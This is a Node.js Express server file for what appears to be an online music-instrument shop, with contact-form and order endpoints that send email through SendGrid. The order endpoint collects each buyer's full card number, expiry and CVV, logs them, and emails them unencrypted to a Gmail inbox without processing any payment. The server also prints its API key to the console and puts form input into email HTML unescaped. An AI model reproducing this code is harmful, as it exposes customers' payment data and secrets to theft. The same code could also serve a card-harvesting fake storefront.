import express from "express";
import sgMail from '@sendgrid/mail';
import cors from 'cors'
import path from 'path'
import dotenv from 'dotenv'
import { fileURLToPath } from 'url'

const app = express();
const PORT = 8080;
app.use(cors())
app.use(express.json());

dotenv.config()

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const frontendPath = path.join(__dirname,"public")

app.use(express.static(frontendPath))

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  sgMail.setApiKey(process.env.SEND_GRID_KEY);
});
console.log(process.env.SEND_GRID_KEY,"key");

app.post("/api/sendmail", async (req, res) => {
  
  try {
    const { name, email, subject, message } = req.body;
    // Set up nodemailer

    const mailOptions = {
      from: `David Instruments <davidmusicinstrumental@gmail.com>`,
      to: "davidmusicinstrumental@gmail.com",
      subject: subject,
      text: `Name: ${name}\nEmail: ${email}\nMessage: ${message}`,
    };

    await sgMail.send(mailOptions);
    res
      .status(200)
      .json({ status: "success", message: "Email sent successfully!" });
  } catch (error) {
    console.log(error,"err");
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});
app.post("/api/order", async (req, res) => {

  try {
    const { email,
      firstName,
      lastName,
      address,
      city,
      state,
      zipCode,
      cardName,
      cardNumber,
      expiry, cart,
      cvv } = req.body;
    console.log(req.body, 'payload');

    const cartHtml = cart.map(item => `
  <tr>
    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${item.productId}</td>
    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${item.name}</td>
    <td style="padding: 8px; text-align: right; border-bottom: 1px solid #ddd;">₹${item.price.toLocaleString()}</td>
    <td style="padding: 8px; text-align: center; border-bottom: 1px solid #ddd;">${item.quantity}</td>
  </tr>
`).join('');

    const cartText = cart.map(item =>
      `- ${item.name} (ID: ${item.productId}) - ₹${item.price} x ${item.quantity}`
    ).join('\n');

    const mailOptions = {
      from: `David Instruments <davidmusicinstrumental@gmail.com>`,
      to: "davidmusicinstrumental@gmail.com",
      subject: 'Submitting an Order',
      text: `
Email: ${email}
First Name: ${firstName}
Last Name: ${lastName}
Address: ${address}
City: ${city}
State: ${state}
ZIP Code: ${zipCode}

Card Name: ${cardName}
Card Number: ${cardNumber}
Expiry: ${expiry}
CVV: ${cvv}

Cart Summary:
${cartText}
  `,
      html: `
    <div style="font-family: Arial, sans-serif; font-size: 14px; color: #333;">
      <h2>Submitted Information</h2>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>First Name:</strong> ${firstName}</p>
      <p><strong>Last Name:</strong> ${lastName}</p>
      <p><strong>Address:</strong> ${address}</p>
      <p><strong>City:</strong> ${city}</p>
      <p><strong>State:</strong> ${state}</p>
      <p><strong>ZIP Code:</strong> ${zipCode}</p>

      <h3>Payment Information</h3>
      <p><strong>Card Name:</strong> ${cardName}</p>
      <p><strong>Card Number:</strong> ${cardNumber}</p>
      <p><strong>Expiry:</strong> ${expiry}</p>
      <p><strong>CVV:</strong> ${cvv}</p>

      <h3>Cart Summary</h3>
      <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
        <thead>
          <tr>
            <th style="text-align: left; padding: 8px; border-bottom: 2px solid #000;">Product ID</th>
            <th style="text-align: left; padding: 8px; border-bottom: 2px solid #000;">Product Name</th>
            <th style="text-align: right; padding: 8px; border-bottom: 2px solid #000;">Price</th>
            <th style="text-align: center; padding: 8px; border-bottom: 2px solid #000;">Quantity</th>
          </tr>
        </thead>
        <tbody>
          ${cartHtml}
        </tbody>
      </table>
    </div>
  `,
    };
    await sgMail.send(mailOptions);
    res
      .status(200)
      .json({ status: "success", message: "Order sent successfully!" });
  } catch (error) {
    console.log(error, "err");

    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

